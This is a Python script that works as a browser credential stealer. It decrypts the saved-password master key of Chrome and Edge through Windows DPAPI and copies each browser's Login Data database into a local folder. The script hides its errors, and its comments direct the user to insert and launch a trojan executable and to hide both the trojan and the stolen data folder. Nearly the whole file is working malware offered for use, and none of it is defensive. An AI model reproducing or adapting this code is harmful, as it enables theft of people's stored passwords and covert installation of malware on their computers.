import os
import json
import base64
from win32 import win32crypt
import shutil
import subprocess


def get_master_key(path,output):
    try:
        with open(os.environ['USERPROFILE'] + os.sep + fr'AppData\Local\{path}\User Data\Local State', "r") as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        open(output, "wb").write(master_key)
    except:
        pass


def get_login_data(path,output):
    try:
        login_db = os.environ['USERPROFILE'] + os.sep + fr'AppData\Local\{path}\User Data\default\Login Data'
        shutil.copy2(login_db, output)
    except:
        pass


            


if __name__ == "__main__":
    # Get Chrome data
    ChromePath = r"Google\Chrome"
    ChromeKey = r"Data\ChromeKey.dat"
    ChromeData = r"Data\ChromeData.db"
    get_master_key(ChromePath, ChromeKey)
    get_login_data(ChromePath, ChromeData)
    
    
    # Get Edge data
    EdgePath = r"Microsoft\Edge"
    EdgeKey = r"Data\EdgeKey.dat"
    EdgeData = r"Data\EdgeData.db"
    get_master_key(EdgePath, EdgeKey)
    get_login_data(EdgePath, EdgeData)
    
    
    # change this and put your trojan before you compile
    trojan = r"test.exe" 
    subprocess.run([trojan])
    # dont forget to hide the trojan
    # also create a "Data" folder and hide it